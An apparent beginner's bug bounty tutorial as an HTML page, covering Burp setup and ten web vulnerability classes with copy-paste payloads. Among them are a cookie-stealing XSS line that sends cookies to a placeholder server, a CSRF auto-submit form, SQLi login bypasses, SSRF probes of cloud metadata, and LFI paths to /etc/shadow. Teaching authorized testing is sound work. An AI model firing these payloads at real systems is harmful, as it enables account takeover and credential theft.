@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bug Bounty for Beginners — Roy 🧭</title>
+<style>
+:root{--bg:#0f0f1a;--sf:#1a1a2e;--sf2:#222240;--bd:#2a2a4a;--ac:#00d4aa;--ac2:#7c6aef;--dg:#ff6b6b;--wn:#ffd93d;--ok:#6bcb77;--in:#4ecdc4;--tx:#e8e8f0;--td:#a0a0b8;--cb:#12121f;--hl:rgba(0,212,170,0.08)}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--tx);line-height:1.8}
+.hero{background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);padding:70px 20px 50px;text-align:center;border-bottom:2px solid var(--bd)}
+.hero-badge{display:inline-block;background:rgba(0,212,170,0.15);color:var(--ac);padding:5px 16px;border-radius:20px;font-size:.85em;font-weight:600;margin-bottom:14px;border:1px solid rgba(0,212,170,0.3)}
+.hero h1{font-size:2.6em;font-weight:800;background:linear-gradient(135deg,var(--ac),var(--ac2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hero p{color:var(--td);font-size:1.1em;margin-top:10px;max-width:600px;margin-left:auto;margin-right:auto}
+.hero-stats{display:flex;justify-content:center;gap:40px;margin-top:28px;flex-wrap:wrap}
+.hero-stat .num{font-size:2em;font-weight:800;color:var(--ac)}.hero-stat .label{font-size:.85em;color:var(--td)}
+.toc{background:var(--sf);border:1px solid var(--bd);border-radius:12px;max-width:900px;margin:36px auto;padding:28px}
+.toc h2{color:var(--ac);margin-bottom:14px;font-size:1.2em}
+.toc-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:10px}
+.toc-item{display:flex;align-items:center;gap:9px;padding:9px 13px;border-radius:8px;background:var(--sf2);border:1px solid var(--bd);text-decoration:none;color:var(--td);transition:all .2s;font-size:.93em}
+.toc-item:hover{border-color:var(--ac);color:var(--ac);background:var(--hl)}
+.ctn{max-width:900px;margin:0 auto;padding:36px 20px}
+.vl{background:var(--sf);border:1px solid var(--bd);border-radius:14px;margin-bottom:44px;overflow:hidden}
+.vt{padding:26px;border-bottom:1px solid var(--bd);display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.vi{font-size:2em}.vn{font-size:1.4em;font-weight:700}
+.vlv{margin-left:auto;padding:4px 12px;border-radius:18px;font-size:.78em;font-weight:700;text-transform:uppercase}
+.lh{background:rgba(255,107,107,.15);color:#ff8a8a;border:1px solid rgba(255,107,107,.3)}
+.lm{background:rgba(255,217,61,.15);color:#ffe066;border:1px solid rgba(255,217,61,.3)}
+.le{background:rgba(107,203,119,.15);color:#8de89b;border:1px solid rgba(107,203,119,.3)}
+.vb{padding:26px}
+.sec{margin-bottom:24px}.sec:last-child{margin-bottom:0}
+.st{color:var(--ac);font-size:1.05em;font-weight:700;margin-bottom:10px}
+.eb{background:var(--hl);border:1px solid rgba(0,212,170,.2);border-radius:10px;padding:18px;margin-bottom:14px}
+.eb h4{color:var(--ac);font-size:.93em;margin-bottom:6px}.eb p{color:var(--td);font-size:.93em}
+.an{background:rgba(124,106,239,.08);border:1px solid rgba(124,106,239,.2);border-radius:10px;padding:14px 18px;margin:10px 0;font-size:.9em}
+.an::before{content:'💡 Analogy: ';font-weight:700;color:var(--ac2)}
+.im{background:rgba(255,107,107,.06);border:1px solid rgba(255,107,107,.15);border-radius:10px;padding:14px 18px;margin:10px 0;font-size:.93em}
+.im strong{color:#ff8a8a}
+ol.stp{counter-reset:step;list-style:none;padding-left:0}
+ol.stp li{counter-increment:step;padding:11px 14px 11px 48px;position:relative;margin-bottom:7px;border-radius:7px;background:var(--sf2);border:1px solid var(--bd);color:var(--td);font-size:.93em}
+ol.stp li::before{content:counter(step);position:absolute;left:10px;top:11px;width:26px;height:26px;background:rgba(0,212,170,.15);color:var(--ac);border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:.82em}
+pre{background:var(--cb);border:1px solid var(--bd);border-radius:8px;padding:14px;overflow-x:auto;font-family:'Fira Code',monospace;font-size:.83em;line-height:1.6;color:#e6edf3;margin-top:6px}
+code{font-family:'Fira Code',monospace;font-size:.88em}
+.ic{background:rgba(0,212,170,.1);color:var(--ac);padding:2px 7px;border-radius:4px;font-size:.86em}
+.ch{display:inline-block;background:rgba(0,212,170,.1);color:var(--ac);padding:2px 9px;border-radius:5px;font-size:.76em;margin-bottom:5px}
+.tb{background:rgba(107,203,119,.08);border-left:3px solid var(--ok);padding:12px 16px;border-radius:0 8px 8px 0;margin-top:10px;font-size:.9em}
+.tb strong{color:var(--ok)}
+.wb{background:rgba(255,107,107,.08);border-left:3px solid var(--dg);padding:12px 16px;border-radius:0 8px 8px 0;margin-top:10px;font-size:.9em}
+.wb strong{color:var(--dg)}
+.ib{background:rgba(78,205,196,.08);border-left:3px solid var(--in);padding:12px 16px;border-radius:0 8px 8px 0;margin-top:10px;font-size:.9em}
+.ib strong{color:var(--in)}
+.tl{display:inline-block;background:rgba(124,106,239,.12);color:var(--ac2);padding:3px 10px;border-radius:12px;font-size:.8em;margin:2px 3px 2px 0;border:1px solid rgba(124,106,239,.2)}
+.foot{text-align:center;padding:44px 20px;color:var(--td);font-size:.85em;border-top:1px solid var(--bd)}
+.foot a{color:var(--ac);text-decoration:none}
+.sw{max-width:480px;margin:0 auto 26px}
+.si{width:100%;padding:12px 18px;background:var(--sf);border:1px solid var(--bd);border-radius:10px;color:var(--tx);font-size:1em;outline:none}
+.si:focus{border-color:var(--ac)}.si::placeholder{color:var(--td)}
+.hd{display:none!important}
+@media(max-width:768px){.hero h1{font-size:1.7em}.vt{padding:18px}.vb{padding:18px}.vlv{margin-left:0;margin-top:6px}}
+</style>
+</head>
+<body>
+<div class="hero">
+<div class="hero-badge">🧑‍💻 Complete Beginner's Guide</div>
+<h1>Bug Bounty for Noobs</h1>
+<p>Never done hacking? No problem. This guide explains everything from scratch — what vulnerabilities are, how to find them, and what to do.</p>
+<div class="hero-stats">
+<div class="hero-stat"><div class="num">10</div><div class="label">Vulnerabilities</div></div>
+<div class="hero-stat"><div class="num">0</div><div class="label">Experience Needed</div></div>
+<div class="hero-stat"><div class="num">100%</div><div class="label">Free Tools</div></div>
+</div></div>
+<div class="toc">
+<h2>📚 What You'll Learn</h2>
+<div class="toc-grid">
+<a class="toc-item" href="#setup"><span>🔧</span> Setting Up Tools</a>
+<a class="toc-item" href="#sqli"><span>💉</span> SQL Injection</a>
+<a class="toc-item" href="#xss"><span>⚡</span> XSS</a>
+<a class="toc-item" href="#idor"><span>🔗</span> IDOR</a>
+<a class="toc-item" href="#redir"><span>↗️</span> Open Redirect</a>
+<a class="toc-item" href="#info"><span>📋</span> Info Disclosure</a>
+<a class="toc-item" href="#csrf"><span>🎭</span> CSRF</a>
+<a class="toc-item" href="#ssrf"><span>🌐</span> SSRF</a>
+<a class="toc-item" href="#auth"><span>🔓</span> Auth Bypass</a>
+<a class="toc-item" href="#lfi"><span>📂</span> File Inclusion</a>
+</div></div>
+<div class="ctn">
+<div class="sw"><input type="text" class="si" id="si" placeholder="🔍 Search..." oninput="fc()"></div>
+
+<!-- SETUP -->
+<div class="vl" id="setup" data-tags="setup tools install burp browser firefox beginner getting started">
+<div class="vt"><div class="vi">🔧</div><div><div class="vn">Setting Up Your Tools</div></div></div>
+<div class="vb">
+<div class="eb"><h4>Before we start — what do you need?</h4><p>You only need two things: a web browser and a proxy tool. That's it.</p></div>
+<div class="sec"><div class="st">1️⃣ Install Firefox + FoxyProxy</div>
+<ol class="stp"><li>Download <strong>Firefox</strong> from firefox.com (free)</li><li>Install <strong>FoxyProxy</strong> extension from Firefox Add-ons</li><li>FoxyProxy lets you switch traffic to Burp Suite</li></ol></div>
+<div class="sec"><div class="st">2️⃣ Install Burp Suite Community</div>
+<ol class="stp"><li>Go to portswigger.net/burp/communitydownload</li><li>Download <strong>Burp Suite Community Edition</strong> (free)</li><li>Open Burp → "Temporary project" → "Use Burp defaults"</li><li>Go to <strong>Proxy</strong> tab → <strong>Options</strong> → note port (usually <span class="ic">8080</span>)</li></ol>
+<div class="ib"><strong>What is Burp Suite?</strong> It's a middleman between your browser and websites. It intercepts traffic so you can see, modify, and replay requests. Think of it as a "pause button" for web traffic.</div></div>
+<div class="sec"><div class="st">3️⃣ Connect Firefox to Burp</div>
+<ol class="stp"><li>Open FoxyProxy → Add new proxy → Host: <span class="ic">127.0.0.1</span>, Port: <span class="ic">8080</span></li><li>Enable the proxy in FoxyProxy</li><li>In Firefox, visit <span class="ic">http://burp</span> → click "CA Certificate"</li><li>Import certificate into Firefox: Settings → Privacy → Certificates → Import</li></ol></div>
+<div class="sec"><div class="st">4️⃣ Test It Works</div>
+<ol class="stp"><li>Turn on FoxyProxy in Firefox</li><li>Visit any website</li><li>Go to Burp → Proxy → <strong>HTTP History</strong></li><li>You should see the request appear! 🎉</li></ol>
+<div class="tb"><strong>💡 Remember:</strong> Always turn OFF the proxy when not testing. It slows down normal browsing.</div></div>
+<div class="sec"><div class="st">Useful Tools</div>
+<span class="tl">Burp Suite</span><span class="tl">Firefox</span><span class="tl">FoxyProxy</span><span class="tl">HackerOne</span><span class="tl">Bugcrowd</span><span class="tl">Subfinder</span><span class="tl">ffuf</span></div>
+</div></div>
+
+<!-- SQLI -->
+<div class="vl" id="sqli" data-tags="sql injection sqli database login search query password blind union error">
+<div class="vt"><div class="vi">💉</div><div><div class="vn">SQL Injection (SQLi)</div></div><span class="vlv lh">Advanced</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is SQL Injection?</h4><p>When you type into a search box or login form, the website sends your input to a database using SQL. SQL Injection happens when the website <strong>doesn't check your input</strong> — so you can trick the database into doing things it shouldn't.</p></div>
+<div class="an">Imagine you tell a waiter your name is <code>"; DROP TABLE customers;--</code>. The waiter writes it on a form, and the kitchen deletes the entire customer database. That's SQL Injection — your "name" became a command.</div>
+<div class="im"><strong>💥 What happens?</strong> An attacker can read all data (passwords, credit cards, messages), delete data, or take control of the server.</div>
+<div class="sec"><div class="st">🎯 Where to find it</div>
+<ul><li><strong>Login forms</strong> — try <code>'</code> in username field</li><li><strong>Search bars</strong> — try <code>test' OR '1'='1</code></li><li><strong>URL parameters</strong> — if URL has <span class="ic">?id=1</span>, try <span class="ic">?id=1' OR '1'='1</span></li><li><strong>Anything with a number</strong> — product IDs, page numbers</li></ul></div>
+<div class="sec"><div class="st">🔬 How to test</div>
+<ol class="stp"><li><strong>Find an input field</strong> — login, search, URL with ?id=</li><li><strong>Type a single quote</strong> <code>'</code> and press Enter. If you see a database error, it might be vulnerable!</li><li><strong>Try:</strong> <code>' OR '1'='1</code> — if you get logged in without password, it's vulnerable.</li><li><strong>Try in URL:</strong> <span class="ic">?id=1' OR '1'='1</span> — if you see extra results, it's vulnerable.</li></ol></div>
+<div class="sec"><div class="st">💉 Beginner Payloads</div>
+<span class="ch">📋 Copy-paste these</span>
+<p style="color:var(--ac2);margin:8px 0 4px;font-weight:600">Login Bypass</p>
+<pre><code>Username: admin'--
+Password: anything
+
+Username: ' OR '1'='1'--
+Password: ' OR '1'='1'--</code></pre>
+<p style="color:var(--ac2);margin:8px 0 4px;font-weight:600">URL Parameter Test</p>
+<pre><code>?id=1' OR '1'='1
+?id=1' AND '1'='1
+?id=1' AND '1'='2  ← (different result = SQLi!)</code></pre>
+<div class="tb"><strong>💡 Beginner Tip:</strong> Start by typing a single quote <code>'</code> everywhere. If the website shows an error, you might have found SQL Injection!</div></div>
+<div class="sec"><div class="st">🛠️ Tools</div>
+<span class="tl">sqlmap</span><span class="tl">Burp Suite</span></div>
+</div></div>
+
+<!-- XSS -->
+<div class="vl" id="xss" data-tags="xss cross-site scripting reflected stored dom script alert injection cookie theft">
+<div class="vt"><div class="vi">⚡</div><div><div class="vn">Cross-Site Scripting (XSS)</div></div><span class="vlv lm">Intermediate</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is XSS?</h4><p>XSS means you can inject <strong>JavaScript code</strong> into a website that other people see. When a victim visits the page, their browser runs YOUR code. This lets you steal cookies (login tokens) or redirect them.</p></div>
+<div class="an">A bulletin board where anyone posts notes. If the board doesn't check what people write, someone could post: "Everyone who reads this: send your house keys to this address." That's XSS — malicious code hidden in a trusted place.</div>
+<div class="im"><strong>💥 What happens?</strong> Attacker steals login sessions, redirects users to phishing sites, changes page content, or takes over accounts.</div>
+<div class="sec"><div class="st">🎯 Where to find it</div>
+<ul><li><strong>Search bars</strong> — does your search term appear on results page?</li><li><strong>Comments/forums</strong> — can you post code in a comment?</li><li><strong>Profile fields</strong> — bio, name, website URL</li><li><strong>Error pages</strong> — visit fake URL, does URL appear in error?</li><li><strong>URL parameters</strong> — does <span class="ic">?name=test</span> show "test" on page?</li></ul></div>
+<div class="sec"><div class="st">🔬 How to test</div>
+<ol class="stp"><li><strong>Find an input</strong> — search bar, comment box, URL param</li><li><strong>Type a unique marker</strong> like <code>XYZTEST123</code> and submit</li><li><strong>Look at the page</strong> — does XYZTEST123 appear? Input is reflected!</li><li><strong>Now try:</strong> <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li><li><strong>If popup appears</strong> with number 1 → XSS confirmed! 🎉</li><li><strong>If blocked</strong> — try: <code>&lt;img src=x onerror=alert(1)&gt;</code></li></ol></div>
+<div class="sec"><div class="st">💉 Beginner Payloads</div>
+<span class="ch">📋 Copy these</span>
+<p style="color:var(--ac2);margin:8px 0 4px;font-weight:600">Basic</p>
+<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></pre>
+<p style="color:var(--ac2);margin:8px 0 4px;font-weight:600">If angle brackets blocked</p>
+<pre><code>&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+" onfocus=alert(1) autofocus="</code></pre>
+<p style="color:var(--ac2);margin:8px 0 4px;font-weight:600">Cookie Stealer (real impact)</p>
+<pre><code>&lt;script&gt;fetch('https://YOUR-SERVER.com/?c='+document.cookie)&lt;/script&gt;</code></pre>
+<div class="tb"><strong>💡 Beginner Tip:</strong> Start with <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. Popup = proof! Take a screenshot.</div></div>
+<div class="sec"><div class="st">🛠️ Tools</div>
+<span class="tl">Dalfox</span><span class="tl">XSStrike</span><span class="tl">Burp Suite</span></div>
+</div></div>
+
+<!-- IDOR -->
+<div class="vl" id="idor" data-tags="idor insecure direct object reference access other users data account profile api id number">
+<div class="vt"><div class="vi">🔗</div><div><div class="vn">IDOR (Accessing Other People's Data)</div></div><span class="vlv le">Beginner Friendly</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is IDOR?</h4><p>The website uses a number (like an ID) to identify your data, but <strong>doesn't check if you OWN that data</strong>. If your profile is <code>/profile?id=100</code>, try <code>/profile?id=101</code> — you might see someone else's profile!</p></div>
+<div class="an">Hotel room keys with just the room number. If your key opens room 100, try 101, 102... you can walk into anyone's room. The hotel should check YOUR key matches YOUR room.</div>
+<div class="im"><strong>💥 What happens?</strong> Attacker views other users' private data — profiles, messages, invoices, payment info.</div>
+<div class="sec"><div class="st">🎯 Where to find it</div>
+<ul><li><strong>Profile pages</strong> — <span class="ic">/profile?id=123</span> → change number</li><li><strong>API calls</strong> — look for numbers in URLs or JSON</li><li><strong>File downloads</strong> — PDF/image links with IDs</li><li><strong>Orders/invoices</strong> — <span class="ic">/order/INV-001</span> → try INV-002</li><li><strong>Mobile apps</strong> — intercept API calls, look for user IDs</li></ul></div>
+<div class="sec"><div class="st">🔬 How to test</div>
+<ol class="stp"><li><strong>Create two accounts</strong> — "attacker" and "victim"</li><li><strong>Login as victim</strong> — do something that creates data (upload, message, order)</li><li><strong>Note the URL/API call</strong> in Burp — look for the ID number</li><li><strong>Login as attacker</strong> — try accessing same URL with victim's ID</li><li><strong>If you see victim's data → IDOR confirmed!</strong> 🎉</li></ol></div>
+<div class="sec"><div class="st">💉 What to try</div>
+<span class="ch">📋 Simple tests</span>
+<pre><code>-- If your data is at:
+/profile?id=100
+
+-- Try:
+/profile?id=101
+/profile?id=99
+/profile?id=1
+/profile?id=0
+
+-- Also try:
+/api/user/100  →  /api/user/101
+/download?file=report_100.pdf  →  report_101.pdf</code></pre>
+<div class="tb"><strong>💡 Beginner Tip:</strong> IDOR is the #1 easiest vulnerability to find with high payouts ($500-$5000+). Always test every number in a URL!</div></div>
+</div></div>
+
+<!-- OPEN REDIRECT -->
+<div class="vl" id="redir" data-tags="open redirect url redirect phishing link redirect external site 302">
+<div class="vt"><div class="vi">↗️</div><div><div class="vn">Open Redirect</div></div><span class="vlv le">Beginner Friendly</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is Open Redirect?</h4><p>Some websites redirect you after login/logout using a "return URL" parameter. If the website <strong>doesn't check WHERE it redirects</strong>, an attacker can send users to a phishing site.</p></div>
+<div class="an">A security guard asks "which floor?" and takes you there without checking. An attacker says "floor 100" (doesn't exist) — the guard just goes there anyway.</div>
+<div class="im"><strong>💥 What happens?</strong> Used in phishing — victim clicks trusted link but gets sent to attacker's fake login page. Also steals OAuth tokens.</div>
+<div class="sec"><div class="st">🎯 Where to find it</div>
+<ul><li><strong>Logout links</strong> — <span class="ic">/logout?redirect=/home</span></li><li><strong>Login redirect</strong> — <span class="ic">/login?next=/dashboard</span></li><li><strong>Common params:</strong> <span class="ic">redirect</span>, <span class="ic">url</span>, <span class="ic">next</span>, <span class="ic">return</span>, <span class="ic">dest</span>, <span class="ic">goto</span></li></ul></div>
+<div class="sec"><div class="st">🔬 How to test</div>
+<ol class="stp"><li><strong>Find a redirect parameter</strong> — look for ?redirect=, ?next=, ?url=</li><li><strong>Change value</strong> to <span class="ic">https://evil.com</span></li><li><strong>Visit URL</strong> — if redirected to evil.com, it's open redirect!</li></ol></div>
+<div class="sec"><div class="st">💉 Payloads</div>
+<span class="ch">📋 Copy-paste</span>
+<pre><code>https://evil.com
+//evil.com
+https://evil.com%00.victim.com
+
+-- If they check domain:
+https://victim.com@evil.com
+https://evil.com#victim.com
+https://victim.com.evil.com</code></pre>
+<div class="tb"><strong>💡 Beginner Tip:</strong> Open redirect is simple to find. Look for it on every website — most have logout redirects or OAuth callbacks.</div></div>
+</div></div>
+
+<!-- INFO DISCLOSURE -->
+<div class="vl" id="info" data-tags="information disclosure sensitive files exposed data backup debug error stack trace git env config">
+<div class="vt"><div class="vi">📋</div><div><div class="vn">Information Disclosure</div></div><span class="vlv le">Beginner Friendly</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is Info Disclosure?</h4><p>Websites sometimes accidentally expose sensitive files, debug info, or config details. These can reveal passwords, API keys, and internal paths. You don't need to "hack" — the data is just <strong>sitting there in the open</strong>.</p></div>
+<div class="an">A company throws away filing cabinets but forgets to remove the files. Anyone can open them and read everything.</div>
+<div class="im"><strong>💥 What happens?</strong> Attackers find API keys, database passwords, admin credentials and use them to break in.</div>
+<div class="sec"><div class="st">🎯 Files to check (just visit these URLs!)</div>
+<span class="ch">📋 No tools needed — just paste in browser</span>
+<pre><code>https://target.com/robots.txt
+https://target.com/.git/config
+https://target.com/.env
+https://target.com/.DS_Store
+https://target.com/web.config
+https://target.com/sitemap.xml
+https://target.com/server-status
+https://target.com/phpinfo.php
+https://target.com/backup.zip
+https://target.com/.htaccess
+https://target.com/debug
+https://target.com/api/
+https://target.com/graphql</code></pre>
+<div class="tb"><strong>💡 Beginner Tip:</strong> EASIEST vulnerability to find. Type these URLs into your browser. If you see anything interesting, screenshot and report!</div></div>
+<div class="sec"><div class="st">🔬 What to look for</div>
+<ul><li><strong>robots.txt</strong> — "Disallow: /admin" reveals hidden pages</li><li><strong>.git/config</strong> — source code might be downloadable!</li><li><strong>.env</strong> — database passwords, API keys, secrets</li><li><strong>phpinfo.php</strong> — PHP version, server info</li><li><strong>Error pages</strong> — trigger error, look for stack traces</li></ul></div>
+</div></div>
+
+<!-- CSRF -->
+<div class="vl" id="csrf" data-tags="csrf cross-site request forgery token state change password email trick browser">
+<div class="vt"><div class="vi">🎭</div><div><div class="vn">CSRF (Tricking Your Browser)</div></div><span class="vlv lm">Intermediate</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is CSRF?</h4><p>CSRF tricks YOUR browser into doing something on a website you're logged into — without your knowledge. If you're logged into your bank and visit a malicious page, it could transfer money from YOUR account.</p></div>
+<div class="an">Your friend gives you a signed check (your browser has cookies). A stranger picks it up, writes "pay me $1000" and cashes it — because it has your valid signature.</div>
+<div class="im"><strong>💥 What happens?</strong> Attacker changes your email, password, transfers money, posts messages, or deletes your account.</div>
+<div class="sec"><div class="st">🔬 How to test</div>
+<ol class="stp"><li><strong>Login to target</strong> and go to sensitive action (change password/email)</li><li><strong>Look at request in Burp</strong> — does it have a CSRF token?</li><li><strong>If NO token → CSRF confirmed!</strong> Make a PoC HTML page</li><li><strong>If there IS a token</strong> — try removing it. Does it still work?</li></ol></div>
+<div class="sec"><div class="st">💉 PoC HTML</div>
+<span class="ch">📋 Save as .html and open while logged into target</span>
+<pre><code>&lt;html&gt;&lt;body&gt;
+  &lt;form method="POST" action="https://target.com/change-email"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+    &lt;input type="submit" value="Click me"&gt;
+  &lt;/form&gt;
+  &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;/body&gt;&lt;/html&gt;</code></pre>
+</div></div>
+
+<!-- SSRF -->
+<div class="vl" id="ssrf" data-tags="ssrf server side request forgery internal network cloud metadata aws localhost 127.0.0.1">
+<div class="vt"><div class="vi">🌐</div><div><div class="vn">SSRF (Server-Side Trick)</div></div><span class="vlv lh">Advanced</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is SSRF?</h4><p>SSRF tricks the <strong>SERVER</strong> into making requests to places it shouldn't — like internal services or cloud metadata APIs. The server trusts itself, so it can access things you can't.</p></div>
+<div class="an">You ask a bank employee to "fetch a document from this URL." You gave them a URL to the bank's internal vault camera. Since they're an employee, they have access — and bring you the footage.</div>
+<div class="im"><strong>💥 What happens?</strong> Can steal cloud credentials (AWS/GCP keys), access internal databases, scan networks.</div>
+<div class="sec"><div class="st">🎯 Where to find it</div>
+<ul><li><strong>"Import from URL"</strong> features</li><li><strong>Image loading by URL</strong> — profile pictures</li><li><strong>PDF generators</strong> — HTML to PDF</li><li><strong>Webhook URLs</strong></li><li><strong>File upload by URL</strong></li></ul></div>
+<div class="sec"><div class="st">🔬 How to test</div>
+<ol class="stp"><li><strong>Set up listener</strong> — go to webhook.site (free, gives you a URL)</li><li><strong>Find a URL input</strong> — any field that takes a URL</li><li><strong>Paste your webhook URL</strong> and submit</li><li><strong>Check webhook.site</strong> — if request appears, SSRF confirmed!</li><li><strong>Try internal URLs:</strong> <span class="ic">http://127.0.0.1</span>, <span class="ic">http://localhost</span></li></ol></div>
+<div class="sec"><div class="st">💉 Payloads</div>
+<pre><code>http://127.0.0.1
+http://localhost
+http://0.0.0.0
+http://[::1]
+http://169.254.169.254/latest/meta-data/  (AWS)</code></pre>
+<div class="wb"><strong>⚠️ Legal Warning:</strong> Only test SSRF on authorized bug bounty programs.</div></div>
+</div></div>
+
+<!-- AUTH BYPASS -->
+<div class="vl" id="auth" data-tags="authentication bypass login admin panel default credentials password reset 2fa bypass">
+<div class="vt"><div class="vi">🔓</div><div><div class="vn">Authentication Bypass</div></div><span class="vlv lm">Intermediate</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is Auth Bypass?</h4><p>You can access accounts or admin panels <strong>without knowing the password</strong>. Includes trying default passwords, resetting passwords insecurely, or skipping 2FA.</p></div>
+<div class="an">A bouncer checks your ID. But if you show a fake "VIP" ID, he just lets you in. The security check exists but doesn't actually work.</div>
+<div class="im"><strong>💥 What happens?</strong> Full account takeover — attacker accesses any account, including admin with full control.</div>
+<div class="sec"><div class="st">🔬 Things to try</div>
+<span class="ch">📋 Simple checks</span>
+<pre><code>-- 1. Default credentials
+admin:admin
+admin:password
+admin:123456
+root:root
+test:test
+
+-- 2. SQLi in login
+Username: admin'--
+Password: anything
+
+-- 3. Admin panels
+/admin  /admin/login  /wp-admin  /administrator  /console
+
+-- 4. 2FA bypass
+# Login → reach 2FA page
+# Try going directly to /dashboard
+# Or remove 2FA code from request</code></pre>
+<div class="tb"><strong>💡 Beginner Tip:</strong> Always try default credentials! You'd be surprised how many sites use admin:admin.</div></div>
+</div></div>
+
+<!-- LFI -->
+<div class="vl" id="lfi" data-tags="lfi local file inclusion path traversal directory traversal ../ etc passwd read files">
+<div class="vt"><div class="vi">📂</div><div><div class="vn">Local File Inclusion (LFI)</div></div><span class="vlv lm">Intermediate</span></div>
+<div class="vb">
+<div class="eb"><h4>🧠 What is LFI?</h4><p>LFI lets you read files from the server by manipulating file paths. If a website loads pages based on a URL parameter (like <span class="ic">?page=about</span>), you can trick it into loading system files like <span class="ic">/etc/passwd</span>.</p></div>
+<div class="an">A librarian fetches books by title. You ask for "the secret employee handbook" and they bring it — they never check if you're allowed to read it.</div>
+<div class="im"><strong>💥 What happens?</strong> Can read passwords, API keys, config files, source code, private keys. Can lead to full server compromise.</div>
+<div class="sec"><div class="st">🎯 Where to find it</div>
+<ul><li><strong>Page params:</strong> <span class="ic">?page=home</span>, <span class="ic">?file=about</span>, <span class="ic">?template=contact</span></li><li><strong>File downloads:</strong> <span class="ic">?doc=report.pdf</span></li><li><strong>Language selectors:</strong> <span class="ic">?lang=en</span></li></ul></div>
+<div class="sec"><div class="st">🔬 How to test</div>
+<ol class="stp"><li><strong>Find a page parameter</strong> — <span class="ic">?page=home</span></li><li><strong>Try traversal:</strong> <span class="ic">?page=../../../../etc/passwd</span></li><li><strong>If you see file contents</strong> (like "root:x:0:0:...") → LFI confirmed!</li><li><strong>If blocked:</strong> try double encoding: <span class="ic">..%252f..%252f..%252fetc/passwd</span></li></ol></div>
+<div class="sec"><div class="st">💉 Payloads</div>
+<span class="ch">📋 Try these</span>
+<pre><code>-- Basic traversal
+../../../../etc/passwd
+....//....//....//etc/passwd  (double encoding)
+
+-- PHP wrapper (read source code)
+php://filter/convert.base64-encode/resource=index.php
+
+-- Common files
+/etc/passwd
+/etc/shadow
+/proc/self/environ
+C:\Windows\System32\drivers\etc\hosts</code></pre>
+</div></div>
+
+</div><!-- end container -->
+
+<div class="foot">
+<p><strong>Bug Bounty for Noobs</strong> — Your journey starts here 🧭</p>
+<p style="margin-top:8px">⚠️ Only test on authorized bug bounty programs. Stay legal!</p>
+<p style="margin-top:12px;font-size:.9em">New to bug bounty? Start with <a href="https://www.hackerone.com">HackerOne</a> and <a href="https://www.bugcrowd.com">Bugcrowd</a></p>
+<p style="margin-top:8px;font-size:.85em"><a href="https://portswigger.net/web-security">PortSwigger Web Security Academy</a> — Free hands-on training</p>
+</div>
+
+<script>
+function fc(){const q=document.getElementById('si').value.toLowerCase();document.querySelectorAll('.vl').forEach(c=>{const s=((c.dataset.tags||'')+' '+(c.querySelector('.vn')?.textContent||'')+' '+(c.querySelector('.vb')?.textContent||'')).toLowerCase();c.classList.toggle('hd',!s.includes(q))})}
+</script>
+</body></html>
